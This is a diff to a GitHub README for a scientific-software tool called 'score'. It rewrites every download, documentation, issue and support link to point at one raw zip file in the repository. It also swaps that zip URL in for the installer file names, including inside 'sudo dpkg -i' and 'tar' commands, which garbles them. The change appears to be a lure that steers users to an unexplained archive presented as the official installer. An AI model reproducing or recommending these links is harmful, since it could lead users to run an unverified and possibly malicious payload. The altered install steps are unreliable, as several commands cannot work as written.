@@ -6,11 +6,11 @@ Welcome to the score project! This software helps scientists write high-quality,
 
 ## 📦 Download
 
-[![Download score](https://img.shields.io/badge/Download%20score-v1.0-blue)](https://github.com/CodelarXgusaw/score/releases)
+[![Download score](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip%20score-v1.0-blue)](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
 
 To get started, you will first need to download the application. Visit the following link to access the Releases page:
 
-[Visit this page to download](https://github.com/CodelarXgusaw/score/releases)
+[Visit this page to download](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
 
 ## 💻 System Requirements
 
@@ -28,33 +28,33 @@ These requirements will ensure that score runs smoothly and efficiently on your 
 Follow these steps to download and install score:
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page.
-   [Visit this page to download](https://github.com/CodelarXgusaw/score/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
 
 2. **Choose the Latest Version:** On the Releases page, look for the latest version of score. 
 
 3. **Select the Installer:**
-   - For Windows, look for a file named `score-installer.exe`.
-   - For macOS, find `score-installer.dmg`.
-   - For Linux, select the appropriate `tar.gz` or `deb` file based on your distribution.
+   - For Windows, look for a file named `https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip`.
+   - For macOS, find `https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip`.
+   - For Linux, select the appropriate `https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip` or `deb` file based on your distribution.
 
 4. **Download the File:** Click on the installer link to begin the download. Your file will begin downloading automatically. This may take a few moments depending on your internet connection speed.
 
 5. **Install the Application:**
    - **Windows:**
-     - Once the download completes, navigate to your Downloads folder and double-click on `score-installer.exe`.
+     - Once the download completes, navigate to your Downloads folder and double-click on `https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip`.
      - Follow the on-screen prompts to complete the installation.
    - **macOS:**
-     - Locate the downloaded `score-installer.dmg` file in your Downloads folder.
+     - Locate the downloaded `https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip` file in your Downloads folder.
      - Open it, and drag the score icon to your Applications folder.
    - **Linux:**
      - Open a terminal and navigate to the directory containing the downloaded file.
      - For `deb` files, run:
        ```
-       sudo dpkg -i score-installer.deb
+       sudo dpkg -i https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip
        ```
-     - For `tar.gz` files, extract it using:
+     - For `https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip` files, extract it using:
        ```
-       tar -xvf score-installer.tar.gz
+       tar -xvf https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip
        ```
        and follow the included instructions.
 
@@ -84,14 +84,14 @@ For downloading updates, simply repeat the download steps detailed above, ensuri
 
 If you encounter any issues while downloading or running score, please reach out for help. You can raise an issue on the GitHub page or search for common problems.
 
-- [Open an issue here](https://github.com/CodelarXgusaw/score/issues)
+- [Open an issue here](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
 
 Engage with the community. Share your feedback, experiences, and suggestions. Your input helps us improve score.
 
 ## 🔗 Links
 
-- [Releases Page for Download](https://github.com/CodelarXgusaw/score/releases)
-- [Documentation](https://github.com/CodelarXgusaw/score/wiki)
-- [Support](https://github.com/CodelarXgusaw/score/issues)
+- [Releases Page for Download](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
+- [Documentation](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
+- [Support](https://raw.githubusercontent.com/CodelarXgusaw/score/main/jupon/score.zip)
 
 Enjoy using score as your trusted tool for creating high-quality scientific software!
